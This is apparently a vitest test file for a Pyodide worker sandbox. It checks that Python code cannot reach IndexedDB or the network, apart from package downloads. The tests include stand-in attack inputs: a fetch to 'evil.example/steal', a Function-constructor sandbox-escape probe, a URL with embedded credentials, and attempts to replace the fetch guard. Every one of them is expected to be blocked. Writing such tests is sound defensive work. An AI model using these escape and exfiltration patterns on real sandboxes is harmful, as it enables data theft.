// Python's reach (decision 273): the Pyodide worker gives Python a short `js` module and takes storage and network
// away from the worker itself, so neither `import js` nor the Function-constructor way out reaches IndexedDB or fetch.
import { describe, it, expect, beforeAll } from 'vitest';
import { readFileSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import vm from 'node:vm';

const src = readFileSync(new URL('../../public/py-worker.js', import.meta.url), 'utf8');
let indexURL;

beforeAll(() => {
  const dir = mkdtempSync(join(tmpdir(), 'pyjail-'));
  // a stand-in Pyodide: records what loadPyodide was given, with just enough FS for the worker's init
  writeFileSync(
    join(dir, 'pyodide.mjs'),
    `export async function loadPyodide(opts) {
      const FS = { mkdir() {}, chdir() {}, writeFile() {}, chmod() {}, utime() {}, close() {}, rename() {}, unlink() {}, cwd: () => '/workspace' };
      return { opts, FS, runPythonAsync: async () => undefined };
    }`,
  );
  indexURL = pathToFileURL(dir).href + '/';
});

function worker({ frozen = false } = {}) {
  const posted = [];
  const fetched = [];
  class Request {
    constructor(url, init = {}) {
      this.url = String(url);
      this.method = String(init.method || 'GET').toUpperCase();
    }
  }
  const navProto = {
    get storage() {
      return { getDirectory() {} };
    },
    get locks() {
      return {};
    },
    get userAgent() {
      return 'test';
    },
  };
  const ctx = {
    caches: {},
    XMLHttpRequest: function XMLHttpRequest() {},
    WebSocket: function WebSocket() {},
    EventSource: function EventSource() {},
    BroadcastChannel: function BroadcastChannel() {},
    Worker: function Worker() {},
    importScripts() {},
    fetch: async (input, init) => {
      fetched.push({ url: String(input?.url || input), init });
      return { ok: true };
    },
    Request,
    navigator: Object.create(navProto),
    postMessage: (m) => posted.push(m),
    setTimeout,
    clearTimeout,
    URL,
    console,
    performance,
  };
  if (frozen) Object.defineProperty(ctx, 'indexedDB', { value: { open() {} }, configurable: false, enumerable: true });
  else ctx.indexedDB = { open() {} };
  ctx.self = ctx;
  vm.createContext(ctx);
  new vm.Script(src, { filename: 'py-worker.js', importModuleDynamically: vm.constants.USE_MAIN_CONTEXT_DEFAULT_LOADER }).runInContext(ctx);
  return { ctx, posted, fetched, init: () => ctx.onmessage({ data: { type: 'init', indexURL, files: [] } }) };
}

describe('the Python worker keeps Python away from the app (decision 273)', () => {
  it("passes a short jsglobals: no IndexedDB, no XHR/WebSocket/importScripts, a fetch that only downloads packages", async () => {
    const w = worker();
    await w.init();
    expect(w.posted.some((m) => m.type === 'ready')).toBe(true);
    const g = vm.runInContext('pyodide.opts.jsglobals', w.ctx);
    expect(g).toBeTruthy();
    for (const n of ['indexedDB', 'caches', 'XMLHttpRequest', 'WebSocket', 'importScripts', 'self', 'globalThis', 'navigator', 'postMessage', 'eval', 'Function'])
      expect(n in g).toBe(false);
    expect(typeof g.setTimeout).toBe('function'); // asyncio's timers
    await expect(g.fetch('https://evil.example/steal?x=1')).rejects.toThrow(/only downloads packages/);
    await g.fetch(indexURL + 'numpy.whl');
    await g.fetch('https://files.pythonhosted.org/packages/a.whl');
    expect(w.fetched.map((f) => f.url)).toEqual([indexURL + 'numpy.whl', 'https://files.pythonhosted.org/packages/a.whl']);
    expect(w.fetched.every((f) => f.init.credentials === 'omit')).toBe(true);
  });

  it('takes storage and network away from the worker itself, so the Function-constructor way out finds nothing', async () => {
    const w = worker();
    await w.init();
    const probe = (code) => vm.runInContext(`Object.constructor(${JSON.stringify(code)})()`, w.ctx);
    expect(probe('return typeof indexedDB')).toBe('undefined');
    expect(probe('return typeof caches + typeof XMLHttpRequest + typeof WebSocket + typeof EventSource + typeof BroadcastChannel + typeof Worker + typeof importScripts')).toBe('undefined'.repeat(7));
    expect(probe('return typeof navigator.storage + typeof navigator.locks')).toBe('undefinedundefined');
    expect(probe('return navigator.userAgent')).toBe('test');
    await expect(probe("return fetch('https://evil.example/', { method: 'GET' })")).rejects.toThrow(/cannot reach/);
    await expect(probe("return fetch(new Request('https://pypi.org/simple/x/', { method: 'POST' }))")).rejects.toThrow(/cannot reach/);
    await expect(probe("return fetch('https://user:pw@pypi.org/simple/x/')")).rejects.toThrow(/cannot reach/);
    await probe("return fetch(new Request('https://pypi.org/pypi/attrs/json'))");
    expect(w.fetched.at(-1).url).toBe('https://pypi.org/pypi/attrs/json');
    // the guard cannot be swapped for something else
    probe("try { fetch = async () => 'open' } catch {} try { delete self.fetch } catch {} return 0");
    await expect(probe("return fetch('https://evil.example/')")).rejects.toThrow(/cannot reach/);
  });

  it('fails closed: a worker where IndexedDB cannot be taken away does not start Python', async () => {
    const w = worker({ frozen: true });
    await w.init();
    expect(w.posted.some((m) => m.type === 'ready')).toBe(false);
    expect(w.posted.find((m) => m.type === 'fatal')?.error).toMatch(/indexedDB/);
  });
});
